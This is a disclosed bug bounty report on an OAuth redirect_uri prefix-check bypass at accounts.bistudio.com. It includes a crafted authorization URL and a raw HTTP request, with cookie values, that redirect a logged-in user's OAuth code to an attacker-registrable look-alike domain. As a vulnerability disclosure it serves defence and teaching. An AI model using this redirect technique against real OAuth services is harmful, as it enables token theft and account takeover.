# Stealing Users OAUTH Tokens via redirect_uri 

## Report Details
- **Report ID**: 405100
- **URL**: https://hackerone.com/reports/405100
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2018-09-04T10:30:38.885Z
- **Disclosed**: 2018-09-14T12:24:09.249Z

## Reporter
- **Username**: ethancruize
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: bohemia

## Vulnerability Information
Hi,
I would like to report an Open redirection on oauth redirect_uri which can lead to users oauth tokens being leaked to any malicious user.

**Detail**

During the OAUTH flow, the redirect_uri on https://accounts.bistudio.com is not properly validating that the URL given is proper, as such a bypass of filter is possible and hence thereby able to exfiltrate users oauth tokens to that nonexisting domain.

On clicking on Login on https://xbox.dayz.com an OAUTH request is triggered to accounts.bistudio.com, the endpoint is checking if the Redirect_uri is starting with https://xbox.dayz.com and not checking the ending bits, as such its possible to inject anything after that. 

As an example i injected https://xbox.dayz.comtest.com and the server's whitelist is bypasses and a redirect is performed to https://xbox.dayz.comtest.com with the code and state values.

**Steps to Reproduce**

* Login to any website in the scope 
* After Login access the following URL - 

```
https://accounts.bistudio.com/api/auth?response_type=code&redirect_uri=http%3A%2F%2Fxbox.dayz.comtest.com%2Fapi%2Fauth%2Fcallback&state=OCoU2LvhmzLGAZ03DWem5QNs&client_id=%24edd1bfdc470df4b8d7b81c2683fc6d3
```
* On accessing you will get redirected to **xbox.dayz.comtest.com** with oauth access code and state, registering such domain is possible and when any loggedin user accesses the URL its possible to steal their oauth creds.


**RAW Request**
```
GET /api/auth?response_type=code&redirect_uri=http%3A%2F%2Fxbox.dayz.comtest.com%2Fapi%2Fauth%2Fcallback&state=OCoU2LvhmzLGAZ03DWem5QNs&client_id=%24edd1bfdc470df4b8d7b81c2683fc6d3 HTTP/1.1
Host: accounts.bistudio.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:61.0) Gecko/20100101 Firefox/61.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://incubator.bohemia.net/
Cookie: cookieconsent_dismissed=yes; bi.accounts.connect.sid=s%3AEbOE7LAPYR9IJO8ocyKuhNoIx_qXNt7_.UWaqiLeZPbgCSPM5nTvWUY2HiRYUXzEjw%2BRPxP3optA; bi_store_auth_session=eyJpdiI6IkcxSWloOVwvdngyaVFjZE9WM012ZzZMRmpkY1VnN1wvOW5abnkyYlNBVklaMD0iLCJ2YWx1ZSI6IjRpUFRUNzFkNElkWkZWeUc4U2o1TkNBaytURlJnVEVyaVFlMTJEc1pjcFR6XC9wUjlHdjd2cDRNQXFaN3hlZjVodHFMaW84WVFxWVJvUG1DOE4xTmtqUT09IiwibWFjIjoiZmRkZThlYjliMmZhMjc4YzBhMWVjMThkN2UxOTc5NmY3MjQ1YTc0NGFlY2FmNGVlNDUwOTU4ZjZmMGU5YTMwMSJ9
Connection: close
Upgrade-Insecure-Requests: 1
```

## Impact

Due to validation bypass in redirect_uri parameter in OAUTH flow, its possible to redirect authenticated users to arbitrary domains with their oauth credentials from which its possible to takeover their account.

Best Regards,
EC

## Attachments
- oauth.PNG
